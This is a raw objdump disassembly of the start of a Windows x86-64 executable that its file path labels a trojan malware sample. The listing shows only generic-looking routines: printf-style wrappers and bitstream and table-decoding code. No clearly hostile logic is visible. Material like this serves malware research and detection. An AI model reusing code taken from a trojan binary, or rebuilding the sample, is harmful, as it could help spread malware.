
malware_samples/trojan/fd651be04d5076375bcf6bc0e32bd51f95d674e8ff67628075b7b363bd2061e4.exe:     file format pei-x86-64


Disassembly of section .text:

0000000140001000 <.text>:
   140001000:	48 8d 05 51 8d 05 00 	lea    0x58d51(%rip),%rax        # 0x140059d58
   140001007:	c3                   	ret
   140001008:	cc                   	int3
   140001009:	cc                   	int3
   14000100a:	cc                   	int3
   14000100b:	cc                   	int3
   14000100c:	cc                   	int3
   14000100d:	cc                   	int3
   14000100e:	cc                   	int3
   14000100f:	cc                   	int3
   140001010:	4c 89 44 24 18       	mov    %r8,0x18(%rsp)
   140001015:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   14000101a:	53                   	push   %rbx
   14000101b:	55                   	push   %rbp
   14000101c:	56                   	push   %rsi
   14000101d:	57                   	push   %rdi
   14000101e:	48 83 ec 38          	sub    $0x38,%rsp
   140001022:	49 8b f0             	mov    %r8,%rsi
   140001025:	48 8d 6c 24 78       	lea    0x78(%rsp),%rbp
   14000102a:	48 8b da             	mov    %rdx,%rbx
   14000102d:	48 8b f9             	mov    %rcx,%rdi
   140001030:	e8 cb ff ff ff       	call   0x140001000
   140001035:	48 89 6c 24 28       	mov    %rbp,0x28(%rsp)
   14000103a:	4c 8b ce             	mov    %rsi,%r9
   14000103d:	4c 8b c3             	mov    %rbx,%r8
   140001040:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   140001047:	00 00 
   140001049:	48 8b d7             	mov    %rdi,%rdx
   14000104c:	48 8b 08             	mov    (%rax),%rcx
   14000104f:	e8 0c 4e 01 00       	call   0x140015e60
   140001054:	85 c0                	test   %eax,%eax
   140001056:	b9 ff ff ff ff       	mov    $0xffffffff,%ecx
   14000105b:	0f 48 c1             	cmovs  %ecx,%eax
   14000105e:	48 83 c4 38          	add    $0x38,%rsp
   140001062:	5f                   	pop    %rdi
   140001063:	5e                   	pop    %rsi
   140001064:	5d                   	pop    %rbp
   140001065:	5b                   	pop    %rbx
   140001066:	c3                   	ret
   140001067:	cc                   	int3
   140001068:	cc                   	int3
   140001069:	cc                   	int3
   14000106a:	cc                   	int3
   14000106b:	cc                   	int3
   14000106c:	cc                   	int3
   14000106d:	cc                   	int3
   14000106e:	cc                   	int3
   14000106f:	cc                   	int3
   140001070:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   140001075:	4c 89 44 24 18       	mov    %r8,0x18(%rsp)
   14000107a:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   14000107f:	53                   	push   %rbx
   140001080:	56                   	push   %rsi
   140001081:	57                   	push   %rdi
   140001082:	48 83 ec 30          	sub    $0x30,%rsp
   140001086:	48 8b fa             	mov    %rdx,%rdi
   140001089:	48 8d 74 24 60       	lea    0x60(%rsp),%rsi
   14000108e:	48 8b d9             	mov    %rcx,%rbx
   140001091:	e8 6a ff ff ff       	call   0x140001000
   140001096:	45 33 c9             	xor    %r9d,%r9d
   140001099:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   14000109e:	4c 8b c7             	mov    %rdi,%r8
   1400010a1:	48 8b d3             	mov    %rbx,%rdx
   1400010a4:	48 8b 08             	mov    (%rax),%rcx
   1400010a7:	e8 3c 4a 01 00       	call   0x140015ae8
   1400010ac:	48 83 c4 30          	add    $0x30,%rsp
   1400010b0:	5f                   	pop    %rdi
   1400010b1:	5e                   	pop    %rsi
   1400010b2:	5b                   	pop    %rbx
   1400010b3:	c3                   	ret
   1400010b4:	cc                   	int3
   1400010b5:	cc                   	int3
   1400010b6:	cc                   	int3
   1400010b7:	cc                   	int3
   1400010b8:	cc                   	int3
   1400010b9:	cc                   	int3
   1400010ba:	cc                   	int3
   1400010bb:	cc                   	int3
   1400010bc:	cc                   	int3
   1400010bd:	cc                   	int3
   1400010be:	cc                   	int3
   1400010bf:	cc                   	int3
   1400010c0:	4c 89 44 24 18       	mov    %r8,0x18(%rsp)
   1400010c5:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   1400010ca:	53                   	push   %rbx
   1400010cb:	55                   	push   %rbp
   1400010cc:	56                   	push   %rsi
   1400010cd:	57                   	push   %rdi
   1400010ce:	48 83 ec 38          	sub    $0x38,%rsp
   1400010d2:	49 8b f0             	mov    %r8,%rsi
   1400010d5:	48 8d 6c 24 78       	lea    0x78(%rsp),%rbp
   1400010da:	48 8b da             	mov    %rdx,%rbx
   1400010dd:	48 8b f9             	mov    %rcx,%rdi
   1400010e0:	e8 1b ff ff ff       	call   0x140001000
   1400010e5:	48 89 6c 24 28       	mov    %rbp,0x28(%rsp)
   1400010ea:	4c 8b ce             	mov    %rsi,%r9
   1400010ed:	4c 8b c3             	mov    %rbx,%r8
   1400010f0:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   1400010f7:	00 00 
   1400010f9:	48 8b d7             	mov    %rdi,%rdx
   1400010fc:	48 8b 08             	mov    (%rax),%rcx
   1400010ff:	48 83 c9 02          	or     $0x2,%rcx
   140001103:	e8 04 4b 01 00       	call   0x140015c0c
   140001108:	85 c0                	test   %eax,%eax
   14000110a:	b9 ff ff ff ff       	mov    $0xffffffff,%ecx
   14000110f:	0f 48 c1             	cmovs  %ecx,%eax
   140001112:	48 83 c4 38          	add    $0x38,%rsp
   140001116:	5f                   	pop    %rdi
   140001117:	5e                   	pop    %rsi
   140001118:	5d                   	pop    %rbp
   140001119:	5b                   	pop    %rbx
   14000111a:	c3                   	ret
   14000111b:	cc                   	int3
   14000111c:	cc                   	int3
   14000111d:	cc                   	int3
   14000111e:	cc                   	int3
   14000111f:	cc                   	int3
   140001120:	0f b7 01             	movzwl (%rcx),%eax
   140001123:	c3                   	ret
   140001124:	cc                   	int3
   140001125:	cc                   	int3
   140001126:	cc                   	int3
   140001127:	cc                   	int3
   140001128:	cc                   	int3
   140001129:	cc                   	int3
   14000112a:	cc                   	int3
   14000112b:	cc                   	int3
   14000112c:	cc                   	int3
   14000112d:	cc                   	int3
   14000112e:	cc                   	int3
   14000112f:	cc                   	int3
   140001130:	4c 8b c9             	mov    %rcx,%r9
   140001133:	49 83 f8 01          	cmp    $0x1,%r8
   140001137:	73 18                	jae    0x140001151
   140001139:	0f 57 c0             	xorps  %xmm0,%xmm0
   14000113c:	33 c0                	xor    %eax,%eax
   14000113e:	0f 11 01             	movups %xmm0,(%rcx)
   140001141:	0f 11 41 10          	movups %xmm0,0x10(%rcx)
   140001145:	48 89 41 20          	mov    %rax,0x20(%rcx)
   140001149:	48 c7 c0 b8 ff ff ff 	mov    $0xffffffffffffffb8,%rax
   140001150:	c3                   	ret
   140001151:	48 89 51 18          	mov    %rdx,0x18(%rcx)
   140001155:	48 8d 42 08          	lea    0x8(%rdx),%rax
   140001159:	48 89 41 20          	mov    %rax,0x20(%rcx)
   14000115d:	49 83 f8 08          	cmp    $0x8,%r8
   140001161:	72 3d                	jb     0x1400011a0
   140001163:	49 8d 40 f8          	lea    -0x8(%r8),%rax
   140001167:	48 03 c2             	add    %rdx,%rax
   14000116a:	48 89 41 10          	mov    %rax,0x10(%rcx)
   14000116e:	48 8b 00             	mov    (%rax),%rax
   140001171:	48 89 01             	mov    %rax,(%rcx)
   140001174:	42 0f b6 44 02 ff    	movzbl -0x1(%rdx,%r8,1),%eax
   14000117a:	33 d2                	xor    %edx,%edx
   14000117c:	84 c0                	test   %al,%al
   14000117e:	74 15                	je     0x140001195
   140001180:	0f bd c8             	bsr    %eax,%ecx
   140001183:	49 8b c0             	mov    %r8,%rax
   140001186:	0f 45 d1             	cmovne %ecx,%edx
   140001189:	b9 08 00 00 00       	mov    $0x8,%ecx
   14000118e:	2b ca                	sub    %edx,%ecx
   140001190:	41 89 49 08          	mov    %ecx,0x8(%r9)
   140001194:	c3                   	ret
   140001195:	89 51 08             	mov    %edx,0x8(%rcx)
   140001198:	48 c7 c0 ff ff ff ff 	mov    $0xffffffffffffffff,%rax
   14000119f:	c3                   	ret
   1400011a0:	48 89 51 10          	mov    %rdx,0x10(%rcx)
   1400011a4:	49 8d 40 fe          	lea    -0x2(%r8),%rax
   1400011a8:	0f b6 0a             	movzbl (%rdx),%ecx
   1400011ab:	49 89 09             	mov    %rcx,(%r9)
   1400011ae:	48 83 f8 05          	cmp    $0x5,%rax
   1400011b2:	77 68                	ja     0x14000121c
   1400011b4:	4c 8d 15 45 ee ff ff 	lea    -0x11bb(%rip),%r10        # 0x140000000
   1400011bb:	41 8b 84 82 58 12 00 	mov    0x1258(%r10,%rax,4),%eax
   1400011c2:	00 
   1400011c3:	49 03 c2             	add    %r10,%rax
   1400011c6:	ff e0                	jmp    *%rax
   1400011c8:	0f b6 42 06          	movzbl 0x6(%rdx),%eax
   1400011cc:	48 c1 e0 30          	shl    $0x30,%rax
   1400011d0:	48 03 c8             	add    %rax,%rcx
   1400011d3:	49 89 09             	mov    %rcx,(%r9)
   1400011d6:	0f b6 42 05          	movzbl 0x5(%rdx),%eax
   1400011da:	48 c1 e0 28          	shl    $0x28,%rax
   1400011de:	48 03 c8             	add    %rax,%rcx
   1400011e1:	49 89 09             	mov    %rcx,(%r9)
   1400011e4:	0f b6 42 04          	movzbl 0x4(%rdx),%eax
   1400011e8:	48 c1 e0 20          	shl    $0x20,%rax
   1400011ec:	48 03 c8             	add    %rax,%rcx
   1400011ef:	49 89 09             	mov    %rcx,(%r9)
   1400011f2:	0f b6 42 03          	movzbl 0x3(%rdx),%eax
   1400011f6:	48 c1 e0 18          	shl    $0x18,%rax
   1400011fa:	48 03 c8             	add    %rax,%rcx
   1400011fd:	49 89 09             	mov    %rcx,(%r9)
   140001200:	0f b6 42 02          	movzbl 0x2(%rdx),%eax
   140001204:	48 c1 e0 10          	shl    $0x10,%rax
   140001208:	48 03 c8             	add    %rax,%rcx
   14000120b:	49 89 09             	mov    %rcx,(%r9)
   14000120e:	0f b6 42 01          	movzbl 0x1(%rdx),%eax
   140001212:	48 c1 e0 08          	shl    $0x8,%rax
   140001216:	48 03 c1             	add    %rcx,%rax
   140001219:	49 89 01             	mov    %rax,(%r9)
   14000121c:	42 0f b6 44 02 ff    	movzbl -0x1(%rdx,%r8,1),%eax
   140001222:	33 d2                	xor    %edx,%edx
   140001224:	84 c0                	test   %al,%al
   140001226:	74 21                	je     0x140001249
   140001228:	0f bd c8             	bsr    %eax,%ecx
   14000122b:	0f 45 d1             	cmovne %ecx,%edx
   14000122e:	b9 08 00 00 00       	mov    $0x8,%ecx
   140001233:	8b c1                	mov    %ecx,%eax
   140001235:	2b c2                	sub    %edx,%eax
   140001237:	41 89 41 08          	mov    %eax,0x8(%r9)
   14000123b:	41 2b c8             	sub    %r8d,%ecx
   14000123e:	8d 0c c8             	lea    (%rax,%rcx,8),%ecx
   140001241:	49 8b c0             	mov    %r8,%rax
   140001244:	41 89 49 08          	mov    %ecx,0x8(%r9)
   140001248:	c3                   	ret
   140001249:	41 89 51 08          	mov    %edx,0x8(%r9)
   14000124d:	48 c7 c0 ec ff ff ff 	mov    $0xffffffffffffffec,%rax
   140001254:	c3                   	ret
   140001255:	0f 1f 00             	nopl   (%rax)
   140001258:	0e                   	(bad)
   140001259:	12 00                	adc    (%rax),%al
   14000125b:	00 00                	add    %al,(%rax)
   14000125d:	12 00                	adc    (%rax),%al
   14000125f:	00 f2                	add    %dh,%dl
   140001261:	11 00                	adc    %eax,(%rax)
   140001263:	00 e4                	add    %ah,%ah
   140001265:	11 00                	adc    %eax,(%rax)
   140001267:	00 d6                	add    %dl,%dh
   140001269:	11 00                	adc    %eax,(%rax)
   14000126b:	00 c8                	add    %cl,%al
   14000126d:	11 00                	adc    %eax,(%rax)
   14000126f:	00 4c 8b c1          	add    %cl,-0x3f(%rbx,%rcx,4)
   140001273:	8b 49 08             	mov    0x8(%rcx),%ecx
   140001276:	8d 04 11             	lea    (%rcx,%rdx,1),%eax
   140001279:	f7 da                	neg    %edx
   14000127b:	41 89 40 08          	mov    %eax,0x8(%r8)
   14000127f:	83 e2 3f             	and    $0x3f,%edx
   140001282:	49 8b 00             	mov    (%r8),%rax
   140001285:	48 d3 e0             	shl    %cl,%rax
   140001288:	0f b6 ca             	movzbl %dl,%ecx
   14000128b:	48 d3 e8             	shr    %cl,%rax
   14000128e:	c3                   	ret
   14000128f:	cc                   	int3
   140001290:	4c 8b 41 10          	mov    0x10(%rcx),%r8
   140001294:	48 8b d1             	mov    %rcx,%rdx
   140001297:	4c 3b 41 20          	cmp    0x20(%rcx),%r8
   14000129b:	73 06                	jae    0x1400012a3
   14000129d:	b8 03 00 00 00       	mov    $0x3,%eax
   1400012a2:	c3                   	ret
   1400012a3:	8b 49 08             	mov    0x8(%rcx),%ecx
   1400012a6:	8b c1                	mov    %ecx,%eax
   1400012a8:	83 e1 07             	and    $0x7,%ecx
   1400012ab:	48 c1 e8 03          	shr    $0x3,%rax
   1400012af:	4c 2b c0             	sub    %rax,%r8
   1400012b2:	89 4a 08             	mov    %ecx,0x8(%rdx)
   1400012b5:	4c 89 42 10          	mov    %r8,0x10(%rdx)
   1400012b9:	49 8b 00             	mov    (%r8),%rax
   1400012bc:	48 89 02             	mov    %rax,(%rdx)
   1400012bf:	33 c0                	xor    %eax,%eax
   1400012c1:	c3                   	ret
   1400012c2:	cc                   	int3
   1400012c3:	cc                   	int3
   1400012c4:	cc                   	int3
   1400012c5:	cc                   	int3
   1400012c6:	cc                   	int3
   1400012c7:	cc                   	int3
   1400012c8:	cc                   	int3
   1400012c9:	cc                   	int3
   1400012ca:	cc                   	int3
   1400012cb:	cc                   	int3
   1400012cc:	cc                   	int3
   1400012cd:	cc                   	int3
   1400012ce:	cc                   	int3
   1400012cf:	cc                   	int3
   1400012d0:	48 83 ec 08          	sub    $0x8,%rsp
   1400012d4:	44 8b 51 08          	mov    0x8(%rcx),%r10d
   1400012d8:	4c 8b c9             	mov    %rcx,%r9
   1400012db:	41 83 fa 40          	cmp    $0x40,%r10d
   1400012df:	76 0a                	jbe    0x1400012eb
   1400012e1:	b8 03 00 00 00       	mov    $0x3,%eax
   1400012e6:	48 83 c4 08          	add    $0x8,%rsp
   1400012ea:	c3                   	ret
   1400012eb:	4c 8b 59 10          	mov    0x10(%rcx),%r11
   1400012ef:	4c 3b 59 20          	cmp    0x20(%rcx),%r11
   1400012f3:	72 23                	jb     0x140001318
   1400012f5:	49 8b c2             	mov    %r10,%rax
   1400012f8:	41 83 e2 07          	and    $0x7,%r10d
   1400012fc:	48 c1 e8 03          	shr    $0x3,%rax
   140001300:	4c 2b d8             	sub    %rax,%r11
   140001303:	44 89 51 08          	mov    %r10d,0x8(%rcx)
   140001307:	4c 89 59 10          	mov    %r11,0x10(%rcx)
   14000130b:	49 8b 03             	mov    (%r11),%rax
   14000130e:	48 89 01             	mov    %rax,(%rcx)
   140001311:	33 c0                	xor    %eax,%eax
   140001313:	48 83 c4 08          	add    $0x8,%rsp
   140001317:	c3                   	ret
   140001318:	48 89 1c 24          	mov    %rbx,(%rsp)
   14000131c:	48 8b 59 18          	mov    0x18(%rcx),%rbx
   140001320:	4c 3b db             	cmp    %rbx,%r11
   140001323:	75 12                	jne    0x140001337
   140001325:	48 8b 1c 24          	mov    (%rsp),%rbx
   140001329:	41 83 fa 40          	cmp    $0x40,%r10d
   14000132d:	1b c0                	sbb    %eax,%eax
   14000132f:	83 c0 02             	add    $0x2,%eax
   140001332:	48 83 c4 08          	add    $0x8,%rsp
   140001336:	c3                   	ret
   140001337:	33 c0                	xor    %eax,%eax
   140001339:	45 8b c2             	mov    %r10d,%r8d
   14000133c:	41 c1 e8 03          	shr    $0x3,%r8d
   140001340:	41 8b cb             	mov    %r11d,%ecx
   140001343:	49 8b d3             	mov    %r11,%rdx
   140001346:	49 2b d0             	sub    %r8,%rdx
   140001349:	48 3b d3             	cmp    %rbx,%rdx
   14000134c:	0f 92 c0             	setb   %al
   14000134f:	2b cb                	sub    %ebx,%ecx
   140001351:	48 3b d3             	cmp    %rbx,%rdx
   140001354:	48 8b 1c 24          	mov    (%rsp),%rbx
   140001358:	41 0f 43 c8          	cmovae %r8d,%ecx
   14000135c:	4c 2b d9             	sub    %rcx,%r11
   14000135f:	4d 89 59 10          	mov    %r11,0x10(%r9)
   140001363:	8d 0c cd 00 00 00 00 	lea    0x0(,%rcx,8),%ecx
   14000136a:	44 2b d1             	sub    %ecx,%r10d
   14000136d:	45 89 51 08          	mov    %r10d,0x8(%r9)
   140001371:	49 8b 0b             	mov    (%r11),%rcx
   140001374:	49 89 09             	mov    %rcx,(%r9)
   140001377:	48 83 c4 08          	add    $0x8,%rsp
   14000137b:	c3                   	ret
   14000137c:	cc                   	int3
   14000137d:	cc                   	int3
   14000137e:	cc                   	int3
   14000137f:	cc                   	int3
   140001380:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   140001385:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   14000138a:	57                   	push   %rdi
   14000138b:	41 54                	push   %r12
   14000138d:	41 55                	push   %r13
   14000138f:	41 56                	push   %r14
   140001391:	41 57                	push   %r15
   140001393:	4c 8b 64 24 50       	mov    0x50(%rsp),%r12
   140001398:	4c 8b f1             	mov    %rcx,%r14
   14000139b:	41 8b c9             	mov    %r9d,%ecx
   14000139e:	41 8b c0             	mov    %r8d,%eax
   1400013a1:	48 ff c0             	inc    %rax
   1400013a4:	41 8b f8             	mov    %r8d,%edi
   1400013a7:	45 8b e9             	mov    %r9d,%r13d
   1400013aa:	4c 8b da             	mov    %rdx,%r11
   1400013ad:	41 b9 01 00 00 00    	mov    $0x1,%r9d
   1400013b3:	45 8b f9             	mov    %r9d,%r15d
   1400013b6:	4d 8d 14 44          	lea    (%r12,%rax,2),%r10
   1400013ba:	41 d3 e7             	shl    %cl,%r15d
   1400013bd:	8d 6f 01             	lea    0x1(%rdi),%ebp
   1400013c0:	41 8b c1             	mov    %r9d,%eax
   1400013c3:	48 d3 e0             	shl    %cl,%rax
   1400013c6:	8b f5                	mov    %ebp,%esi
   1400013c8:	45 8d 47 ff          	lea    -0x1(%r15),%r8d
   1400013cc:	41 8b d0             	mov    %r8d,%edx
   1400013cf:	48 8d 04 68          	lea    (%rax,%rbp,2),%rax
   1400013d3:	48 83 c0 08          	add    $0x8,%rax
   1400013d7:	48 3b 44 24 58       	cmp    0x58(%rsp),%rax
   1400013dc:	0f 87 0a 02 00 00    	ja     0x1400015ec
   1400013e2:	81 ff ff 00 00 00    	cmp    $0xff,%edi
   1400013e8:	0f 87 fe 01 00 00    	ja     0x1400015ec
   1400013ee:	83 f9 0c             	cmp    $0xc,%ecx
   1400013f1:	76 0c                	jbe    0x1400013ff
   1400013f3:	48 c7 c0 d4 ff ff ff 	mov    $0xffffffffffffffd4,%rax
   1400013fa:	e9 87 01 00 00       	jmp    0x140001586
   1400013ff:	41 8d 4d ff          	lea    -0x1(%r13),%ecx
   140001403:	48 89 5c 24 30       	mov    %rbx,0x30(%rsp)
   140001408:	33 db                	xor    %ebx,%ebx
   14000140a:	66 44 89 4c 24 42    	mov    %r9w,0x42(%rsp)
   140001410:	66 41 d3 e1          	shl    %cl,%r9w
   140001414:	8b fb                	mov    %ebx,%edi
   140001416:	66 44 89 6c 24 40    	mov    %r13w,0x40(%rsp)
   14000141c:	85 ed                	test   %ebp,%ebp
   14000141e:	74 4f                	je     0x14000146f
   140001420:	49 8b db             	mov    %r11,%rbx
   140001423:	49 8b cc             	mov    %r12,%rcx
   140001426:	49 2b dc             	sub    %r12,%rbx
   140001429:	41 bc 01 00 00 00    	mov    $0x1,%r12d
   14000142f:	45 33 c0             	xor    %r8d,%r8d
   140001432:	0f b7 04 0b          	movzwl (%rbx,%rcx,1),%eax
   140001436:	66 83 f8 ff          	cmp    $0xffff,%ax
   14000143a:	75 0f                	jne    0x14000144b
   14000143c:	8b c2                	mov    %edx,%eax
   14000143e:	ff ca                	dec    %edx
   140001440:	41 88 7c 86 06       	mov    %dil,0x6(%r14,%rax,4)
   140001445:	41 0f b7 c4          	movzwl %r12w,%eax
   140001449:	eb 0c                	jmp    0x140001457
   14000144b:	66 41 3b c1          	cmp    %r9w,%ax
   14000144f:	7c 06                	jl     0x140001457
   140001451:	66 44 89 44 24 42    	mov    %r8w,0x42(%rsp)
   140001457:	66 89 01             	mov    %ax,(%rcx)
   14000145a:	ff c7                	inc    %edi
   14000145c:	48 83 c1 02          	add    $0x2,%rcx
   140001460:	3b fd                	cmp    %ebp,%edi
   140001462:	72 ce                	jb     0x140001432
   140001464:	4c 8b 64 24 50       	mov    0x50(%rsp),%r12
   140001469:	45 8d 47 ff          	lea    -0x1(%r15),%r8d
   14000146d:	33 db                	xor    %ebx,%ebx
   14000146f:	8b 44 24 40          	mov    0x40(%rsp),%eax
   140001473:	41 8b ff             	mov    %r15d,%edi
   140001476:	d1 ef                	shr    $1,%edi
   140001478:	41 8b cf             	mov    %r15d,%ecx
   14000147b:	83 c7 03             	add    $0x3,%edi
   14000147e:	c1 e9 03             	shr    $0x3,%ecx
   140001481:	03 f9                	add    %ecx,%edi
   140001483:	41 89 06             	mov    %eax,(%r14)
   140001486:	41 3b d0             	cmp    %r8d,%edx
   140001489:	0f 85 0b 01 00 00    	jne    0x14000159a
   14000148f:	33 c0                	xor    %eax,%eax
   140001491:	45 8b c8             	mov    %r8d,%r9d
   140001494:	8b df                	mov    %edi,%ebx
   140001496:	44 8b c0             	mov    %eax,%r8d
   140001499:	85 ed                	test   %ebp,%ebp
   14000149b:	74 46                	je     0x1400014e3
   14000149d:	48 bd 01 01 01 01 01 	movabs $0x101010101010101,%rbp
   1400014a4:	01 01 01 
   1400014a7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   1400014ae:	00 00 
   1400014b0:	49 0f bf 13          	movswq (%r11),%rdx
   1400014b4:	4b 89 04 02          	mov    %rax,(%r10,%r8,1)
   1400014b8:	48 83 fa 08          	cmp    $0x8,%rdx
   1400014bc:	7e 15                	jle    0x1400014d3
   1400014be:	48 8d 4a f7          	lea    -0x9(%rdx),%rcx
   1400014c2:	48 c1 e9 03          	shr    $0x3,%rcx
   1400014c6:	49 8d 7a 08          	lea    0x8(%r10),%rdi
   1400014ca:	48 ff c1             	inc    %rcx
   1400014cd:	49 03 f8             	add    %r8,%rdi
   1400014d0:	f3 48 ab             	rep stos %rax,(%rdi)
   1400014d3:	4c 03 c2             	add    %rdx,%r8
   1400014d6:	49 83 c3 02          	add    $0x2,%r11
   1400014da:	48 03 c5             	add    %rbp,%rax
   1400014dd:	48 83 ee 01          	sub    $0x1,%rsi
   1400014e1:	75 cd                	jne    0x1400014b0
   1400014e3:	33 c0                	xor    %eax,%eax
   1400014e5:	41 8b ff             	mov    %r15d,%edi
   1400014e8:	8b d0                	mov    %eax,%edx
   1400014ea:	45 85 ff             	test   %r15d,%r15d
   1400014ed:	74 42                	je     0x140001531
   1400014ef:	48 ff cf             	dec    %rdi
   1400014f2:	48 d1 ef             	shr    $1,%rdi
   1400014f5:	48 ff c7             	inc    %rdi
   1400014f8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   1400014ff:	00 
   140001500:	41 0f b6 02          	movzbl (%r10),%eax
   140001504:	4d 8d 52 02          	lea    0x2(%r10),%r10
   140001508:	48 8b ca             	mov    %rdx,%rcx
   14000150b:	49 23 c9             	and    %r9,%rcx
   14000150e:	41 88 44 8e 06       	mov    %al,0x6(%r14,%rcx,4)
   140001513:	48 8d 0c 1a          	lea    (%rdx,%rbx,1),%rcx
   140001517:	41 0f b6 42 ff       	movzbl -0x1(%r10),%eax
   14000151c:	48 8d 14 5a          	lea    (%rdx,%rbx,2),%rdx
   140001520:	49 23 c9             	and    %r9,%rcx
   140001523:	49 23 d1             	and    %r9,%rdx
   140001526:	41 88 44 8e 06       	mov    %al,0x6(%r14,%rcx,4)
   14000152b:	48 83 ef 01          	sub    $0x1,%rdi
   14000152f:	75 cf                	jne    0x140001500
   140001531:	33 db                	xor    %ebx,%ebx
   140001533:	45 85 ff             	test   %r15d,%r15d
   140001536:	74 47                	je     0x14000157f
   140001538:	4d 8d 46 07          	lea    0x7(%r14),%r8
   14000153c:	45 8b cf             	mov    %r15d,%r9d
   14000153f:	90                   	nop
   140001540:	41 0f b6 40 ff       	movzbl -0x1(%r8),%eax
   140001545:	4d 8d 40 04          	lea    0x4(%r8),%r8
   140001549:	41 0f b7 3c 44       	movzwl (%r12,%rax,2),%edi
   14000154e:	49 8d 0c 44          	lea    (%r12,%rax,2),%rcx
   140001552:	8b d3                	mov    %ebx,%edx
   140001554:	8d 47 01             	lea    0x1(%rdi),%eax
   140001557:	66 89 01             	mov    %ax,(%rcx)
   14000155a:	0f bd cf             	bsr    %edi,%ecx
   14000155d:	0f b6 c1             	movzbl %cl,%eax
   140001560:	41 0f b6 cd          	movzbl %r13b,%ecx
   140001564:	0f 45 d0             	cmovne %eax,%edx
   140001567:	2a ca                	sub    %dl,%cl
   140001569:	66 d3 e7             	shl    %cl,%di
   14000156c:	66 41 2b ff          	sub    %r15w,%di
   140001570:	41 88 48 fc          	mov    %cl,-0x4(%r8)
   140001574:	66 41 89 78 f9       	mov    %di,-0x7(%r8)
   140001579:	49 83 e9 01          	sub    $0x1,%r9
   14000157d:	75 c1                	jne    0x140001540
   14000157f:	33 c0                	xor    %eax,%eax
   140001581:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140001586:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   14000158b:	48 8b 74 24 48       	mov    0x48(%rsp),%rsi
   140001590:	41 5f                	pop    %r15
   140001592:	41 5e                	pop    %r14
   140001594:	41 5d                	pop    %r13
   140001596:	41 5c                	pop    %r12
   140001598:	5f                   	pop    %rdi
   140001599:	c3                   	ret
   14000159a:	8b c3                	mov    %ebx,%eax
   14000159c:	44 8b d3             	mov    %ebx,%r10d
   14000159f:	85 ed                	test   %ebp,%ebp
   1400015a1:	74 90                	je     0x140001533
   1400015a3:	41 0f bf 0b          	movswl (%r11),%ecx
   1400015a7:	85 c9                	test   %ecx,%ecx
   1400015a9:	7e 24                	jle    0x1400015cf
   1400015ab:	44 8b c9             	mov    %ecx,%r9d
   1400015ae:	66 90                	xchg   %ax,%ax
   1400015b0:	8b c8                	mov    %eax,%ecx
   1400015b2:	03 c7                	add    %edi,%eax
   1400015b4:	41 23 c0             	and    %r8d,%eax
   1400015b7:	45 88 54 8e 06       	mov    %r10b,0x6(%r14,%rcx,4)
   1400015bc:	3b c2                	cmp    %edx,%eax
   1400015be:	76 09                	jbe    0x1400015c9
   1400015c0:	03 c7                	add    %edi,%eax
   1400015c2:	41 23 c0             	and    %r8d,%eax
   1400015c5:	3b c2                	cmp    %edx,%eax
   1400015c7:	77 f7                	ja     0x1400015c0
   1400015c9:	49 83 e9 01          	sub    $0x1,%r9
   1400015cd:	75 e1                	jne    0x1400015b0
   1400015cf:	41 ff c2             	inc    %r10d
   1400015d2:	49 83 c3 02          	add    $0x2,%r11
   1400015d6:	44 3b d5             	cmp    %ebp,%r10d
   1400015d9:	72 c8                	jb     0x1400015a3
   1400015db:	85 c0                	test   %eax,%eax
   1400015dd:	0f 84 50 ff ff ff    	je     0x140001533
   1400015e3:	48 c7 c0 ff ff ff ff 	mov    $0xffffffffffffffff,%rax
   1400015ea:	eb 95                	jmp    0x140001581
   1400015ec:	48 c7 c0 d2 ff ff ff 	mov    $0xffffffffffffffd2,%rax
   1400015f3:	eb 91                	jmp    0x140001586
   1400015f5:	cc                   	int3
   1400015f6:	cc                   	int3
   1400015f7:	cc                   	int3
   1400015f8:	cc                   	int3
   1400015f9:	cc                   	int3
   1400015fa:	cc                   	int3
   1400015fb:	cc                   	int3
   1400015fc:	cc                   	int3
   1400015fd:	cc                   	int3
   1400015fe:	cc                   	int3
   1400015ff:	cc                   	int3
   140001600:	40 53                	rex push %rbx
   140001602:	55                   	push   %rbp
   140001603:	56                   	push   %rsi
   140001604:	57                   	push   %rdi
   140001605:	48 81 ec a8 02 00 00 	sub    $0x2a8,%rsp
   14000160c:	48 8b 05 ed f9 02 00 	mov    0x2f9ed(%rip),%rax        # 0x140031000
   140001613:	48 33 c4             	xor    %rsp,%rax
   140001616:	48 89 84 24 80 02 00 	mov    %rax,0x280(%rsp)
   14000161d:	00 
   14000161e:	48 8b bc 24 f8 02 00 	mov    0x2f8(%rsp),%rdi
   140001625:	00 
   140001626:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   14000162b:	49 8b d9             	mov    %r9,%rbx
   14000162e:	48 89 4c 24 40       	mov    %rcx,0x40(%rsp)
   140001633:	4d 8b c8             	mov    %r8,%r9
   140001636:	48 89 7c 24 38       	mov    %rdi,0x38(%rsp)
   14000163b:	49 8b f0             	mov    %r8,%rsi
   14000163e:	c7 44 24 30 ff 00 00 	movl   $0xff,0x30(%rsp)
   140001645:	00 
   140001646:	48 8b e9             	mov    %rcx,%rbp
   140001649:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   14000164e:	4c 8d 44 24 48       	lea    0x48(%rsp),%r8
   140001653:	48 8d 8c 24 80 00 00 	lea    0x80(%rsp),%rcx
   14000165a:	00 
   14000165b:	e8 50 0c 00 00       	call   0x1400022b0
   140001660:	48 83 f8 88          	cmp    $0xffffffffffffff88,%rax
   140001664:	0f 87 56 04 00 00    	ja     0x140001ac0
   14000166a:	44 8b 4c 24 48       	mov    0x48(%rsp),%r9d
   14000166f:	41 83 f9 06          	cmp    $0x6,%r9d
   140001673:	76 0c                	jbe    0x140001681
   140001675:	48 c7 c0 d4 ff ff ff 	mov    $0xffffffffffffffd4,%rax
   14000167c:	e9 3f 04 00 00       	jmp    0x140001ac0
   140001681:	44 8b 54 24 30       	mov    0x30(%rsp),%r10d
